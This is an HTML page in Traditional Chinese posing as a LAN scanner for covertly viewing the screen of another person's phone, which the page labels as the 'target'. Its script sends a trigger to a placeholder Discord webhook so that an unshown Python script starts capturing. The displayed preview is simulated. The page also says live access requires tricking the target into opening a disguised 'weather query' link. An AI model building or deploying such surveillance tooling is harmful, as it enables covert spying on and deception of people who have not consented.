<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="utf-8">
<title>網路安全管理系統</title>
<style>
    body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: #00ff41; text-align: center; padding: 20px; }
    .container { max-width: 600px; margin: auto; background: #262626; padding: 20px; border-radius: 15px; border: 1px solid #444; }
    h1 { color: #fff; font-size: 24px; border-bottom: 2px solid #00ff41; padding-bottom: 10px; }
    .device-list { text-align: left; margin: 20px 0; }
    .device-item { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid #333; transition: 0.3s; }
    .device-item:hover { background: #333; }
    .info { font-size: 14px; color: #aaa; }
    button { background: #00ff41; color: #000; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
    button:hover { background: #00cc33; }
    #preview { margin-top: 20px; width: 100%; border: 1px dashed #555; height: 200px; display: flex; align-items: center; justify-content: center; color: #555; }
</style>
</head>
<body>

<div class="container">
    <h1>📡 區域網路掃描儀</h1>
    <p>正在感應目前連線設備...</p>
    
    <div class="device-list">
        <!-- 模擬從 Python 後端傳回的設備資料 -->
        <div class="device-item">
            <div>
                <strong>iPhone 15 Pro (本人)</strong><br>
                <span class="info">IP: 192.168.1.5 | MAC: 00:0C:29:XX:XX</span>
            </div>
            <span>連線中</span>
        </div>

        <div class="device-item">
            <div>
                <strong>Samsung SM-G991 (目標)</strong><br>
                <span class="info">IP: 192.168.1.12 | MAC: 24:FC:E5:XX:XX</span>
            </div>
            <button onclick="viewScreen()">查看畫面</button>
        </div>
    </div>

    <h3>🖼 即時監視畫面</h3>
    <div id="preview">
        等待數據傳輸中...
    </div>
    <p id="status"></p>
</div>

<script>
// 這裡填入你的 Discord Webhook，用來接收指令或回傳
var webhook = "你的_WEBHOOK_URL";

function viewScreen() {
    document.getElementById("status").innerHTML = "正在嘗試攔截設備影像...";
    document.getElementById("preview").innerHTML = '<img src="https://via.placeholder.com..." style="width:100%;">';
    
    // 實際上，這會發送一個指令到 Discord，告訴你的 Python 腳本開始擷取
    fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: "🔔 **管理員觸發：請求查看目標畫面**"
        })
    });

    // 模擬 3 秒後顯示「成功」
    setTimeout(() => {
        document.getElementById("status").innerHTML = "⚠️ 需配合目標開啟「天氣查詢」連結方可獲得即時畫面。";
    }, 3000);
}
</script>

</body>
</html>
